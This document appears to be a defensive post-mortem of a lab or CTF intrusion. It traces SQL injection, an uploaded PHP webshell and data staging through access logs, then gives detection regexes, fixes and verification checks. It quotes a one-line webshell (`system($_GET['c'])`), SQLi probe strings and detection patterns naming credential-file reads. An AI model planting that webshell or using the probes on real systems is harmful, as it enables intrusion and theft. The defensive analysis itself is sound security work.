# Defense notes — Post Mortem

## What happened

1. **SQLi** on `product.php?id=`: the access.log shows probing
   (`%27`, `union select`, `information_schema`) from `10.66.6.6`, ending
   with 200 responses — the query dumped table data.
2. **Upload → webshell**: a POST to `upload.php` dropped `x.php`
   (`<?php system($_GET['c']) ?>`) into `/var/www/html/uploads/` —
   subsequent `GET /uploads/x.php?c=...` lines run `id`, `tar`, `cat`.
3. **Staging + exfil**: the attacker created `/tmp/.loot/`, tarred
   `/etc` snippets + `flag.txt`, then transferred the tarball out.

## Detection lessons

- **SQLi in logs**: regex for `union|select.*from|%27|%2f` in request URIs;
  a burst of 4xx/500 followed by 200s is the signature of success.
- **Webshell**: new `.php` files in upload dirs; requests to uploaded files
  that take query strings like `?c=`/`?cmd=`; `www-data` running `tar`,
  `cat /etc/passwd`, or network tools — alert on all three.
- **Exfil**: outbound transfer size anomaly; tarballs in `/tmp`;
  `lsof`/auditd on archive creation.

## Fixes

- Parameterized queries; WAF rule for SQLi patterns; least-privilege DB user.
- Upload dir: `php_admin_flag engine off` (or store outside docroot),
  content-type allowlist, randomized names.
- Egress filtering for `www-data`; separate `/tmp` with `noexec`.

## Verify

- `find /var/www -name '*.php' -newer /etc/hostname` returns only known files.
- Replay `?c=id` — must 404/403.
